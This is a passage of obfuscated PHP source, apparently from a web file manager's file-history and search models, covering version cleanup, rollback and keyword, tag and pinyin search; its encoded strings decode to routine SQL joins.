$GLOBALS[$¿š¯ÉğŠ[6]][$¿š¯ÉğŠ[88]][$¿š¯ÉğŠ[1139]]; if ($£¨àÒäå > 1) { $this->historyAutoClear($¹ôì[$¿š¯ÉğŠ[406]]); $this->add($¹ôì); } Hook::trigger($¿š¯ÉğŠ[1983], $¹ôì); Model($¿š¯ÉğŠ[1984])->eventFileEdit($ìÎ€“³À[$¿š¯ÉğŠ[406]]); } private function historyAutoClear($òËÆÁÊØ) { $ïã®Ø© =& $_SERVER[Ù×¯Ø…]; $Ì„Âú† = Model($ïã®Ø©[769])->get($ïã®Ø©[1161]); $™÷°‰º = $GLOBALS[$ïã®Ø©[6]][$ïã®Ø©[88]][$ïã®Ø©[1139]]; $Ï…ˆ»Ÿó = $Ì„Âú† == $ïã®Ø©[1162] ? 5 : $™÷°‰º; if ($™÷°‰º <= 1) { $Ï…ˆ»Ÿó = 1; } if ($Ï…ˆ»Ÿó >= 500) { return; } $çÉèÊ‹ = array($ïã®Ø©[421] => $òËÆÁÊØ); $ãÇØÄŞ± = $this->field($ïã®Ø©[1985])->where($çÉèÊ‹)->order($ïã®Ø©[1979])->select(); if (!$ãÇØÄŞ± || $Ï…ˆ»Ÿó >= count($ãÇØÄŞ±)) { return; } $Ì¡¾¹Ù“ = array_to_keyvalue($ãÇØÄŞ±, $ïã®Ø©[33], $ïã®Ø©[395]); $Ì¡¾¹Ù“ = array_slice($Ì¡¾¹Ù“, $Ï…ˆ»Ÿó); $ö…–Ú– = array_to_keyvalue($ãÇØÄŞ±, $ïã®Ø©[33], $ïã®Ø©[470]); $ö…–Ú– = array_slice($ö…–Ú–, $Ï…ˆ»Ÿó); if (!$Ì¡¾¹Ù“ || !$ö…–Ú–) { return; } $çÉèÊ‹ = array($ïã®Ø©[423] => array($ïã®Ø©[7], $Ì¡¾¹Ù“)); $this->where($çÉèÊ‹)->delete(); Model($ïã®Ø©[473])->remove($ö…–Ú–); } public function listData($òëÊ„°Œ) { $­ñ±ä‡Î =& $_SERVER[Ù×¯Ø…]; $ÖŸª–˜® = array($­ñ±ä‡Î[421] => $òëÊ„°Œ); $ÓîãàÖí = $­ñ±ä‡Î[1986]; $Ü“¾ö“ = $this->field($ÓîãàÖí)->where($ÖŸª–˜®)->order($­ñ±ä‡Î[1979])->selectPage(); $this->_listAppendUser($Ü“¾ö“[$­ñ±ä‡Î[367]]); $Õ’î„Ü¯ = Model($­ñ±ä‡Î[769])->get($­ñ±ä‡Î[1161]); $—ÍÊ÷ßÄ = 5; if ($Õ’î„Ü¯ == $­ñ±ä‡Î[1162]) { $Ü“¾ö“[$­ñ±ä‡Î[367]] = array_slice($Ü“¾ö“[$­ñ±ä‡Î[367]], 0, $—ÍÊ÷ßÄ); $Ü“¾ö“[$­ñ±ä‡Î[364]] = array($­ñ±ä‡Î[1987] => 1, $­ñ±ä‡Î[1988] => 20, $­ñ±ä‡Î[1989] => 1, $­ñ±ä‡Î[1990] => count($Ü“¾ö“[$­ñ±ä‡Î[367]])); } return $Ü“¾ö“; } protected function _listAppendUser(&$£‹—şùŠ) { $«Î÷‘Îª =& $_SERVER[Ù×¯Ø…]; $ÀÀÕ¦Ó‘ = array_to_keyvalue($£‹—şùŠ, $«Î÷‘Îª[33], $«Î÷‘Îª[1580]); $¦œ´Õ”² = Model($«Î÷‘Îª[541])->userListInfo($ÀÀÕ¦Ó‘); foreach ($£‹—şùŠ as &$šáŒ‡) { $š˜‡æš = $šáŒ‡[$«Î÷‘Îª[1580]]; $šáŒ‡[$«Î÷‘Îª[455]] = $¦œ´Õ”²[$š˜‡æš] ? $¦œ´Õ”²[$š˜‡æš] : !1; } unset($šáŒ‡); } public function fileInfo($éáÉë¶ˆ) { $èÏ‚â–½ =& $_SERVER[Ù×¯Ø…]; $Ãß…¨Â‘ = $this->tablePrefix; $àß…¶‰ª = "{$Ãß…¨Â‘}\x69\x6f\137\146\x69\x6c\x65\40\x66\x69\x6c\145\163\x20\157\x6e\40\x66\151\154\145\x73\x2e\x66\x69\x6c\x65\x49\104\x20\75\40\x68\x69\163\x74\x6f\x72\171\x2e\146\151\x6c\145\x49\x44"; return $this->alias($èÏ‚â–½[1991])->where(array($èÏ‚â–½[423] => $éáÉë¶ˆ))->join($àß…¶‰ª, $èÏ‚â–½[1992])->find(); } public function removeItem($ªĞ‘‚Û–) { $´ÔªıŸ« =& $_SERVER[Ù×¯Ø…]; $§ÇÀ¾¯ú = array($´ÔªıŸ«[423] => $ªĞ‘‚Û–); $Ï¦“üÔ = $this->where($§ÇÀ¾¯ú)->find(); if ($Ï¦“üÔ) { $…”Ñ¡Çæ = $this->where($§ÇÀ¾¯ú)->delete(); Model($´ÔªıŸ«[473])->remove($Ï¦“üÔ[$´ÔªıŸ«[470]]); return $…”Ñ¡Çæ; } return !1; } public function removeBySource($–ò–›§) { $ŠÕô®£ =& $_SERVER[Ù×¯Ø…]; if (!$–ò–›§) { return !1; } if (!is_array($–ò–›§)) { $–ò–›§ = array($–ò–›§); } $çº‹¦ÄÑ = array($ŠÕô®£[421] => array($ŠÕô®£[7], $–ò–›§)); $Óñêˆ²â = $this->field($ŠÕô®£[471])->where($çº‹¦ÄÑ)->select(); if ($Óñêˆ²â) { $this->where($çº‹¦ÄÑ)->delete(); $ÖˆşÎŠ = array_to_keyvalue($Óñêˆ²â, $ŠÕô®£[33], $ŠÕô®£[470]); Model($ŠÕô®£[473])->remove($ÖˆşÎŠ); } return !0; } public function setDetail($ÛÆ—õ½, $‘öŠ¾½ä) { $Ø˜ÃµÕ® =& $_SERVER[Ù×¯Ø…]; return $this->where(array($Ø˜ÃµÕ®[423] => $ÛÆ—õ½))->save(array($Ø˜ÃµÕ®[1982] => $‘öŠ¾½ä)); } public function rollbackToItem($œéú˜º¶, $ÛÙ×ó×) { $ôÜí• =& $_SERVER[Ù×¯Ø…]; $ÁˆéŠÊ = Model($ôÜí•[831])->sourceInfo($œéú˜º¶); $this->addHistory($ÁˆéŠÊ, LNG($ôÜí•[1993])); $¬³Ú…¶ = $this->find($ÛÙ×ó×); $§Š’úáª = array($ôÜí•[470] => $¬³Ú…¶[$ôÜí•[470]], $ôÜí•[78] => $¬³Ú…¶[$ôÜí•[78]], $ôÜí•[84] => time(), $ôÜí•[457] => USER_ID); Model($ôÜí•[831])->where(array($ôÜí•[406] => $œéú˜º¶))->save($§Š’úáª); return $this->where(array($ôÜí•[423] => $ÛÙ×ó×))->delete(); } public function clearSame($Ø†æò†¼) { $Ôãé²ŸŠ =& $_SERVER[Ù×¯Ø…]; $Ê¿’ö´ = $this->listData($Ø†æò†¼); $ı×Î…úô = array_to_keyvalue_group($Ê¿’ö´, $Ôãé²ŸŠ[470]); $‹ÊŸ·ï = array(); $¿ÅÁØ¤Æ = array(); foreach ($ı×Î…úô as $ ¼›÷ÉĞ) { if (!$ ¼›÷ÉĞ || count($ ¼›÷ÉĞ) <= 1) { continue; } foreach ($ ¼›÷ÉĞ as $®´šğ‚Ê) { $‹ÊŸ·ï[] = $®´šğ‚Ê[$Ôãé²ŸŠ[470]]; $¿ÅÁØ¤Æ[] = $®´šğ‚Ê[$Ôãé²ŸŠ[395]]; } } if (!$¿ÅÁØ¤Æ) { return; } $this->where(array($Ôãé²ŸŠ[395] => array($Ôãé²ŸŠ[7], $¿ÅÁØ¤Æ)))->delete(); Model($Ôãé²ŸŠ[473])->remove($‹ÊŸ·ï); } public function userSpace() { $«í¬ó°é =& $_SERVER[Ù×¯Ø…]; $ÀĞ¯ÖŞê = $this->tablePrefix; $ıº„ÅÓÜ = array($«í¬ó°é[1571] => USER_ID); $‰Ùª…Û = "{$ÀĞ¯ÖŞê}\151\x6f\x5f\146\151\x6c\145\40\146\151\154\x65\x73\40\157\x6e\40\146\x69\x6c\145\163\56\x66\151\154\145\111\104\40\x3d\x20\x68\x69\163\x74\157\x72\x79\x2e\x66\151\154\145\111\x44"; return $this->alias($«í¬ó°é[1991])->where($ıº„ÅÓÜ)->join($‰Ùª…Û, $«í¬ó°é[1992])->sum($«í¬ó°é[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¨É°Ü†‘) { $˜õ˜Î† =& $_SERVER[Ù×¯Ø…]; $ÕÇ¦Ú£ = KodIO::fileTypeList(); $ıãµûµ– = $ÕÇ¦Ú£[$¨É°Ü†‘]; if (!$ıãµûµ–) { return array(); } $ò¹‚ˆ”Ö = $ıãµûµ–[$˜õ˜Î†[168]]; $² Ä² ¤ = $˜õ˜Î†[7]; if (!$ıãµûµ–[$˜õ˜Î†[168]]) { $Áï©©°Ü = array_to_keyvalue($ÕÇ¦Ú£, $˜õ˜Î†[33], $˜õ˜Î†[168]); $ò¹‚ˆ”Ö = implode($˜õ˜Î†[47], $Áï©©°Ü); $² Ä² ¤ = $˜õ˜Î†[1994]; } $ÚšªˆÚ³ = explode($˜õ˜Î†[47], trim($ò¹‚ˆ”Ö, $˜õ˜Î†[47])); return array($² Ä² ¤, $ÚšªˆÚ³); } public function listPathType($‹ˆÍƒ‡) { $Ü»Ó¾›­ =& $_SERVER[Ù×¯Ø…]; $É²øå£ì = $this->fileTypeWhere($‹ˆÍƒ‡); if (!$É²øå£ì) { return array(); } $ş÷ó¢ ¯ = array($Ü»Ó¾›­[583] => SourceModel::TYPE_USER, $Ü»Ó¾›­[584] => USER_ID, $Ü»Ó¾›­[580] => 0, $Ü»Ó¾›­[581] => $É²øå£ì); return $this->listSource($ş÷ó¢ ¯); } public function listSearch($Œï€ò½¾, $ÍÁ†è = 300) { $£îİøÇ˜ =& $_SERVER[Ù×¯Ø…]; if (isset($Œï€ò½¾[$£îİøÇ˜[1839]]) && $Œï€ò½¾[$£îİøÇ˜[1839]]) { $Œï€ò½¾[$£îİøÇ˜[1839]] = str_replace($£îİøÇ˜[382], $£îİøÇ˜[1995], trim($Œï€ò½¾[$£îİøÇ˜[1839]])); } $àÕŸ¿£÷ = $this->_parseSearchWhere($Œï€ò½¾); $ŞµåŞ¾‡ = $àÕŸ¿£÷; if (!isset($àÕŸ¿£÷[$£îİøÇ˜[434]])) { $àÕŸ¿£÷[$£îİøÇ˜[434]] = 0; } $íâé°Ä = $£îİøÇ˜[1996]; $ÊûÂ‹÷« = $íâé°Ä; $this->_listSearchBindPinyin($Œï€ò½¾, $àÕŸ¿£÷, $íâé°Ä); $this->alias($£îİøÇ˜[447])->_makeOrder(); $àÕŸ¿£÷ = $this->parseWhereLike($àÕŸ¿£÷); $ü¿ç«úˆ = $this->distinct(!0)->field($íâé°Ä)->where($àÕŸ¿£÷)->selectPage($ÍÁ†è); $this->_listSearchFileContent($ü¿ç«úˆ, $Œï€ò½¾, $ÊûÂ‹÷«, $ŞµåŞ¾‡); $this->_listSearchDesc($ü¿ç«úˆ, $Œï€ò½¾, $ÊûÂ‹÷«); $this->_listSearchTag($ü¿ç«úˆ, $Œï€ò½¾, $ÊûÂ‹÷«); $this->_listSearchGroupTag($ü¿ç«úˆ, $Œï€ò½¾, $ÊûÂ‹÷«); $this->_listDataApply($ü¿ç«úˆ[$£îİøÇ˜[367]]); $this->_listMake($ü¿ç«úˆ); return $ü¿ç«úˆ; } private function _listSearchFileContent(&$³Éë‘®ó, $è€çÑƒ, $€šíş, $ß†æó–ò) { $ß¸ñàÁ· =& $_SERVER[Ù×¯Ø…]; if (!$è€çÑƒ[$ß¸ñàÁ·[1839]] || $³Éë‘®ó[$ß¸ñàÁ·[364]][$ß¸ñàÁ·[351]] > 1) { return; } if (!isset($ß†æó–ò[$ß¸ñàÁ·[28]]) || !is_array($è€çÑƒ[$ß¸ñàÁ·[470]])) { return; } $ß†æó–ò[$ß¸ñàÁ·[470]] = array($ß¸ñàÁ·[7], $è€çÑƒ[$ß¸ñàÁ·[470]]); unset($ß†æó–ò[$ß¸ñàÁ·[28]]); unset($è€çÑƒ[$ß¸ñàÁ·[470]]); $Ò°ü­ûÏ = $this->field($€šíş)->where($ß†æó–ò)->limit($ß¸ñàÁ·[1997])->select(); if (!$Ò°ü­ûÏ || count($Ò°ü­ûÏ) == 0) { return; } $³Éë‘®ó[$ß¸ñàÁ·[367]] = array_merge($Ò°ü­ûÏ, $³Éë‘®ó[$ß¸ñàÁ·[367]]); $³Éë‘®ó[$ß¸ñàÁ·[364]][$ß¸ñàÁ·[365]] += count($Ò°ü­ûÏ); } private function _listSearchTag(&$Ë¿Áƒ’ç, $ô…Ó•àá, $ğç°Ë«) { $çÅÁ–Öö =& $_SERVER[Ù×¯Ø…]; if (!$ô…Ó•àá[$çÅÁ–Öö[1839]] || $Ë¿Áƒ’ç[$çÅÁ–Öö[364]][$çÅÁ–Öö[351]] > 1) { return; } $ÅÖßãå = Model($çÅÁ–Öö[1998])->listData(); $×ÅØ¢‰Ì = array(); $²ŞŠ¢î© = $ô…Ó•àá[$çÅÁ–Öö[1839]]; foreach ($ÅÖßãå as $–¿¢È™Õ) { $¬…‹½Ú¾ = $–¿¢È™Õ[$çÅÁ–Öö[28]]; $Õ®ù®¥‚ = str_replace($çÅÁ–Öö[50], $çÅÁ–Öö[33], Pinyin::get($¬…‹½Ú¾)); if (stripos($¬…‹½Ú¾, $²ŞŠ¢î©) !== !1 || stripos($Õ®ù®¥‚, $²ŞŠ¢î©) !== !1) { $×ÅØ¢‰Ì[] = $–¿¢È™Õ[$çÅÁ–Öö[395]]; } } if (!$×ÅØ¢‰Ì) { return; } $¢ÃÊÍş = array($çÅÁ–Öö[430] => array($çÅÁ–Öö[7], $×ÅØ¢‰Ì), $çÅÁ–Öö[1580] => USER_ID); $÷§Ô–•ƒ = Model($çÅÁ–Öö[431])->field($çÅÁ–Öö[76])->where($¢ÃÊÍş)->select(); $÷§Ô–•ƒ = array_to_keyvalue($÷§Ô–•ƒ, $çÅÁ–Öö[33], $çÅÁ–Öö[76]); $ë®äÖ–Á = array_unique($÷§Ô–•ƒ); $this->_listSearchMerge($Ë¿Áƒ’ç, $ô…Ó•àá, $ğç°Ë«, $ë®äÖ–Á); } private function _listSearchDesc(&$’»˜¹¸, $ü™‰ıÎµ, $ú«ÅÌÕ) { $ÀöáÅê¢ =& $_SERVER[Ù×¯Ø…]; if (!$ü™‰ıÎµ[$ÀöáÅê¢[1839]] || $’»˜¹¸[$ÀöáÅê¢[364]][$ÀöáÅê¢[351]] > 1) { return; } $ÛóÔŞš = $this->listSearchChildren($ü™‰ıÎµ[$ÀöáÅê¢[501]]); $ÛóÔŞš = array_unique($ÛóÔŞš); if (!$ÛóÔŞš) { return; } $åÉĞÔĞ° = array($ÀöáÅê¢[406] => array($ÀöáÅê¢[7], $ÛóÔŞš), $ÀöáÅê¢[93] => $ÀöáÅê¢[454], $ÀöáÅê¢[372] => array($ÀöáÅê¢[381], $ÀöáÅê¢[1841] . $ü™‰ıÎµ[$ÀöáÅê¢[1839]] . $ÀöáÅê¢[1841])); $–ßÎüÉ… = Model($ÀöáÅê¢[566])->field($ÀöáÅê¢[406])->where($åÉĞÔĞ°)->select(); $¥Í“Ú³ = array_to_keyvalue($–ßÎüÉ…, $ÀöáÅê¢[33], $ÀöáÅê¢[406]); $this->_listSearchMerge($’»˜¹¸, $ü™‰ıÎµ, $ú«ÅÌÕ, $¥Í“Ú³); } private function _listSearchGroupTag(&$İìçÖ‹, $­ÉÂöÑ, $˜î²Ä‹) { $æœ£×åÊ =& $_SERVER[Ù×¯Ø…]; if (!$­ÉÂöÑ[$æœ£×åÊ[1839]] || $İìçÖ‹[$æœ£×åÊ[364]][$æœ£×åÊ[351]] > 1 || !$­ÉÂöÑ[$æœ£×åÊ[501]]) { return; } $×éÑşı† = $this->sourceInfo($­ÉÂöÑ[$æœ£×åÊ[501]]); if (!$×éÑşı† || $×éÑşı†[$æœ£×åÊ[415]] != SourceModel::TYPE_GROUP) { return; } $§­šÇŞ¾ = $×éÑşı†[$æœ£×åÊ[507]]; $¥Şú´î = Model($æœ£×åÊ[1999])->get($§­šÇŞ¾); $¦°Ğ‚ Ö = array(); $üÂÉ›„ = $­ÉÂöÑ[$æœ£×åÊ[1839]]; foreach ($¥Şú´î[$æœ£×åÊ[367]] as $²²Õ³âå) { $·îá°èÈ = $²²Õ³âå[$æœ£×åÊ[28]]; $¨î¢Áà = str_replace($æœ£×åÊ[50], $æœ£×åÊ[33], Pinyin::get($·îá°èÈ)); if (stripos($·îá°èÈ, $üÂÉ›„) !== !1 || stripos($¨î¢Áà, $üÂÉ›„) !== !1) { $¦°Ğ‚ Ö[] = $²²Õ³âå[$æœ£×åÊ[395]]; } } if (!$¦°Ğ‚ Ö) { return; } $Ğşç¿Ú = array($æœ£×åÊ[430] => array($æœ£×åÊ[7], $¦°Ğ‚ Ö), $æœ£×åÊ[1580] => 0, $æœ£×åÊ[29] => $æœ£×åÊ[1863] . $§­šÇŞ¾); $Û´’ØÉ = Model($æœ£×åÊ[431])->field($æœ£×åÊ[76])->where($Ğşç¿Ú)->select(); $Û´’ØÉ = array_to_keyvalue($Û´’ØÉ, $æœ£×åÊ[33], $æœ£×åÊ[76]); $óìˆ·ûÄ = array_unique($Û´’ØÉ); $this->_listSearchMerge($İìçÖ‹, $­ÉÂöÑ, $˜î²Ä‹, $óìˆ·ûÄ); } private function _listSearchMerge(&$šÉÈÒÁ±, $ñä¶«–Å, $ğ£¶Ù¼, $—œŸª¤) { $üöÄ¦’ =& $_SERVER[Ù×¯Ø…]; if (!$—œŸª¤) { return; } $è¼¯Ï = array_to_keyvalue($šÉÈÒÁ±[$üöÄ¦’[367]], $üöÄ¦’[33], $üöÄ¦’[406]); $ì³ë‚Šú = array_diff($—œŸª¤, $è¼¯Ï); if (!$ì³ë‚Šú) { return; } $Äğ‘¨ğ• = array($üöÄ¦’[406] => array($üöÄ¦’[7], $ì³ë‚Šú)); $Â»†„Ä = $this->field($ğ£¶Ù¼)->where($Äğ‘¨ğ•)->select(); if (!$Â»†„Ä) { return; } $õ÷±ü¢» = array(); foreach ($Â»†„Ä as $ùÉÏ’ö) { if ($this->_listSearchFilter($ùÉÏ’ö, $ñä¶«–Å)) { $õ÷±ü¢»[] = $ùÉÏ’ö; } } $šÉÈÒÁ±[$üöÄ¦’[367]] = array_merge($õ÷±ü¢», $šÉÈÒÁ±[$üöÄ¦’[367]]); $šÉÈÒÁ±[$üöÄ¦’[364]][$üöÄ¦’[365]] += count($õ÷±ü¢»); } private function _listSearchFilter($éîñğî, $˜Å…¤¤) { $´ÎÎü³ =& $_SERVER[Ù×¯Ø…]; $ ›â˜š¬ = $éîñğî[$´ÎÎü³[414]] == $´ÎÎü³[87]; if (!strstr($éîñğî[$´ÎÎü³[524]], $´ÎÎü³[47] . $˜Å…¤¤[$´ÎÎü³[501]] . $´ÎÎü³[47])) { return !1; } if (isset($˜Å…¤¤[$´ÎÎü³[416]]) && $˜Å…¤¤[$´ÎÎü³[416]] != $´ÎÎü³[1802]) { if ($˜Å…¤¤[$´ÎÎü³[416]] == $´ÎÎü³[77] && !$ ›â˜š¬) { return !1; } if ($˜Å…¤¤[$´ÎÎü³[416]] != $´ÎÎü³[77] && $ ›â˜š¬) { return !1; } if (!strstr($éîñğî[$´ÎÎü³[168]], $´ÎÎü³[47] . $˜Å…¤¤[$´ÎÎü³[416]] . $´ÎÎü³[47])) { return !1; } } if (isset($˜Å…¤¤[$´ÎÎü³[2000]]) && $˜Å…¤¤[$´ÎÎü³[2000]] < $éîñğî[$´ÎÎü³[78]]) { return !1; } if (isset($˜Å…¤¤[$´ÎÎü³[2001]]) && $˜Å…¤¤[$´ÎÎü³[2001]] > $éîñğî[$´ÎÎü³[78]]) { return !1; } if (isset($˜Å…¤¤[$´ÎÎü³[597]]) && $˜Å…¤¤[$´ÎÎü³[597]] != $éîñğî[$´ÎÎü³[457]]) { return !1; } return !0; } public function listSearchChildren($™ÏÇ•Âõ, $ïª‰şü = 5000) { $°½ÆœÒÏ =& $_SERVER[Ù×¯Ø…]; $ ›èë” = array(); $ò¿§õÒ = $this->sourceInfo($™ÏÇ•Âõ); $œÓĞìÛ = array($°½ÆœÒÏ[524] => array($°½ÆœÒÏ[381], $ò¿§õÒ[$°½ÆœÒÏ[524]] . $ò¿§õÒ[$°½ÆœÒÏ[406]] . $°½ÆœÒÏ[548])); $˜ûãµÖ¸ = $this->field($°½ÆœÒÏ[406])->cache(null, 600)->where($œÓĞìÛ)->count(); if ($˜ûãµÖ¸ > $ïª‰şü) { return $this->_listSearchChildrenNear($™ÏÇ•Âõ, $ïª‰şü); } $ãã¾ã = $this->field($°½ÆœÒÏ[406])->where($œÓĞìÛ)->select(); $ ›èë” = array_to_keyvalue($ãã¾ã, $°½ÆœÒÏ[33], $°½ÆœÒÏ[406]); return $ ›èë”; } private function _listSearchChildrenNear($ïó›ƒ°á, $ï‘ß½µ×) { $ôñİÇ =& $_SERVER[Ù×¯Ø…]; $äĞ†ÊÒğ = array(); $‚¬ää± = array($ôñİÇ[501] => $ïó›ƒ°á); $íäŞ°Ã = $this->field($ôñİÇ[2002])->where($‚¬ää±)->select(); $çí¹âØô = array_to_keyvalue(array_filter_by_field($íäŞ°Ã, $ôñİÇ[414], $ôñİÇ[87]), $ôñİÇ[33], $ôñİÇ[406]); $äĞ†ÊÒğ = array_merge($äĞ†ÊÒğ, array_to_keyvalue($íäŞ°Ã, $ôñİÇ[33], $ôñİÇ[406])); if (!$çí¹âØô) { return $äĞ†ÊÒğ; } $‚¬ää± = array($ôñİÇ[501] => array($ôñİÇ[7], $çí¹âØô)); $íäŞ°Ã = $this->field($ôñİÇ[2002])->where($‚¬ää±)->limit($ï‘ß½µ×)->select(); $äĞ†ÊÒğ = array_merge($äĞ†ÊÒğ, array_to_keyvalue($íäŞ°Ã, $ôñİÇ[33], $ôñİÇ[406])); $äĞ†ÊÒğ = array_slice($äĞ†ÊÒğ, 0, $ï‘ß½µ×); return $äĞ†ÊÒğ; } private function _listSearchBindPinyin($¸½“ºÌ¹, &$Àúõ ­Î, &$ Ú™áÇ€) { $ş»—“ˆô =& $_SERVER[Ù×¯Ø…]; if (!isset($¸½“ºÌ¹[$ş»—“ˆô[1839]]) || !$¸½“ºÌ¹[$ş»—“ˆô[1839]]) { return; } if (!Input::check($¸½“ºÌ¹[$ş»—“ˆô[1839]], $ş»—“ˆô[316]) || strlen($¸½“ºÌ¹[$ş»—“ˆô[1839]]) < 2) { return; } $ÍÄ³äãÖ = "\x4c\105\x46\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\137\163\157\165\162\x63\145\x5f\x6d\145\x74\x61\40\x6d\145\x74\141\40\157\x6e\40\163\157\165\162\143\145\56\163\x6f\165\162\x63\x65\x49\x44\x20\x3d\40\x6d\x65\164\141\x2e\163\x6f\x75\x72\143\145\x49\x44"; $œ‹×ãı– = array(); $ Ú™áÇ€ = str_replace(array($ş»—“ˆô[229], $ş»—“ˆô[50], $ş»—“ˆô[2003]), $ş»—“ˆô[33], $ Ú™áÇ€); $ Ú™áÇ€ = $ş»—“ˆô[439] . str_replace($ş»—“ˆô[47], $ş»—“ˆô[440], $ Ú™áÇ€); $¶’ôÙ¿ = $Àúõ ­Î[$ş»—“ˆô[28]]; unset($Àúõ ­Î[$ş»—“ˆô[28]]); foreach ($Àúõ ­Î as $ºŠá¡µ => $ú™¼Œ„ã) { $œ‹×ãı–[$ş»—“ˆô[439] . $ºŠá¡µ] = $ú™¼Œ„ã; } foreach ($¶’ôÙ¿ as $ıäÊÊ¯) { $œ‹×ãı–[] = array($ş»—“ˆô[444] => $ıäÊÊ¯, $ş»—“ˆô[996] => $ş»—“ˆô[1843], array($ş»—“ˆô[2004] => $ıäÊÊ¯, $ş»—“ˆô[2005] => array($ş»—“ˆô[7], array($ş»—“ˆô[467], $ş»—“ˆô[466])))); } $this->join($ÍÄ³äãÖ); $Àúõ ­Î = $œ‹×ãı–; } private function _parseSearchWhere($Û÷·‰à) { $Ë³Ó°Ñ• =& $_SERVER[Ù×¯Ø…]; $ÅŠ”äÄ  = array(); if (isset($Û÷·‰à[$Ë³Ó°Ñ•[760]]) && $Û÷·‰à[$Ë³Ó°Ñ•[760]]) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[84]] = array($Ë³Ó°Ñ•[2006], $Û÷·‰à[$Ë³Ó°Ñ•[760]]); } if (isset($Û÷·‰à[$Ë³Ó°Ñ•[499]]) && $Û÷·‰à[$Ë³Ó°Ñ•[499]]) { $§ØÜ™‡« = array($Ë³Ó°Ñ•[2007], $Û÷·‰à[$Ë³Ó°Ñ•[499]]); if ($ÅŠ”äÄ [$Ë³Ó°Ñ•[84]]) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[84]] = array($ÅŠ”äÄ [$Ë³Ó°Ñ•[84]], $§ØÜ™‡«, $Ë³Ó°Ñ•[2008]); } else { $ÅŠ”äÄ [$Ë³Ó°Ñ•[84]] = $§ØÜ™‡«; } } if (isset($Û÷·‰à[$Ë³Ó°Ñ•[2000]]) && $Û÷·‰à[$Ë³Ó°Ñ•[2000]] > 0) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[78]] = array($Ë³Ó°Ñ•[2006], $Û÷·‰à[$Ë³Ó°Ñ•[2000]]); } if (isset($Û÷·‰à[$Ë³Ó°Ñ•[2001]]) && $Û÷·‰à[$Ë³Ó°Ñ•[2001]]) { $§ØÜ™‡« = array($Ë³Ó°Ñ•[2007], $Û÷·‰à[$Ë³Ó°Ñ•[2001]]); if ($ÅŠ”äÄ [$Ë³Ó°Ñ•[78]]) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[78]] = array($ÅŠ”äÄ [$Ë³Ó°Ñ•[78]], $§ØÜ™‡«, $Ë³Ó°Ñ•[2008]); } else { $ÅŠ”äÄ [$Ë³Ó°Ñ•[78]] = $§ØÜ™‡«; } } if (isset($Û÷·‰à[$Ë³Ó°Ñ•[597]]) && $Û÷·‰à[$Ë³Ó°Ñ•[597]]) { $ÅŠ”äÄ [] = array($Ë³Ó°Ñ•[457] => $Û÷·‰à[$Ë³Ó°Ñ•[597]], $Ë³Ó°Ñ•[455] => $Û÷·‰à[$Ë³Ó°Ñ•[597]], $Ë³Ó°Ñ•[996] => $Ë³Ó°Ñ•[1843]); } if (isset($Û÷·‰à[$Ë³Ó°Ñ•[416]]) && $Û÷·‰à[$Ë³Ó°Ñ•[416]]) { $½å´óúÙ = $Û÷·‰à[$Ë³Ó°Ñ•[416]]; if ($½å´óúÙ == $Ë³Ó°Ñ•[77]) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[414]] = 1; } else { if ($½å´óúÙ == $Ë³Ó°Ñ•[2009]) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[414]] = 0; } else { if ($½å´óúÙ) { $½å´óúÙ = is_array($½å´óúÙ) ? $½å´óúÙ : explode($Ë³Ó°Ñ•[47], $½å´óúÙ); $ÅŠ”äÄ [$Ë³Ó°Ñ•[416]] = array($Ë³Ó°Ñ•[422], $½å´óúÙ); $ÅŠ”äÄ [$Ë³Ó°Ñ•[414]] = 0; } } } } $this->_parseSearchParent($Û÷·‰à, $ÅŠ”äÄ ); if (isset($Û÷·‰à[$Ë³Ó°Ñ•[1839]]) && trim($Û÷·‰à[$Ë³Ó°Ñ•[1839]])) { $¡¼’ÀÚ = trim($Û÷·‰à[$Ë³Ó°Ñ•[1839]]); $ÎçáÚ– = explode($Ë³Ó°Ñ•[50], $¡¼’ÀÚ); if (strlen($¡¼’ÀÚ) > 2 && (substr($¡¼’ÀÚ, 0, 1) == $Ë³Ó°Ñ•[116] && substr($¡¼’ÀÚ, -1) == $Ë³Ó°Ñ•[116]) || substr($¡¼’ÀÚ, 0, 1) == $Ë³Ó°Ñ•[55] && substr($¡¼’ÀÚ, -1) == $Ë³Ó°Ñ•[55]) { $¡¼’ÀÚ = substr($¡¼’ÀÚ, 1, -1); $ÎçáÚ– = array($¡¼’ÀÚ); } $ÅŠ”äÄ [$Ë³Ó°Ñ•[28]] = array(array($Ë³Ó°Ñ•[547], $Ë³Ó°Ñ•[1841] . $¡¼’ÀÚ . $Ë³Ó°Ñ•[1841])); if (count($ÎçáÚ–) > 1) { $ÅŠ”äÄ [$Ë³Ó°Ñ•[28]] = array(); foreach ($ÎçáÚ– as $±Üû¯Œô) { if (!trim($±Üû¯Œô)) { continue; } $ÅŠ”äÄ [$Ë³Ó°Ñ•[28]][] = array($Ë³Ó°Ñ•[547], $Ë³Ó°Ñ•[1841] . trim($±Üû¯Œô) . $Ë³Ó°Ñ•[1841]); } } } return $ÅŠ”äÄ ; } private function _parseSearchParent($×èĞÙ¨¼, &$ÂİÚ°ê) { $ä÷íÉ¯¥ =& $_SERVER[Ù×¯Ø…]; if (!isset($×èĞÙ¨¼[$ä÷íÉ¯¥[501]]) || !$×èĞÙ¨¼[$ä÷íÉ¯¥[501]]) { return; } $Âã¨÷’Î = $this->pathInfo($×èĞÙ¨¼[$ä÷íÉ¯¥[501]]); $ø„ç€´· = $Âã¨÷’Î[$ä÷íÉ¯¥[501]] . $ä÷íÉ¯¥[33] === $ä÷íÉ¯¥[191]; $ÕÚøÓÎ = $Âã¨÷’Î[$ä÷íÉ¯¥[415]] == $ä÷íÉ¯¥[518]; $ÂİÚ°ê[$ä÷íÉ¯¥[587]] = array($ä÷íÉ¯¥[547], $Âã¨÷’Î[$ä÷íÉ¯¥[524]] . $×èĞÙ¨¼[$ä÷íÉ¯¥[501]] . $ä÷íÉ¯¥[548]); $ì±ğµı‘ = isset($×èĞÙ¨¼[$ä÷íÉ¯¥[1706]]) && in_array($ä÷íÉ¯¥[518], $×èĞÙ¨¼[$ä÷íÉ¯¥[1706]]); if (!$ì±ğµı‘ || !$ÕÚøÓÎ || !$ø„ç€´· || !$Âã¨÷’Î[$ä÷íÉ¯¥[417]]) { return; } if 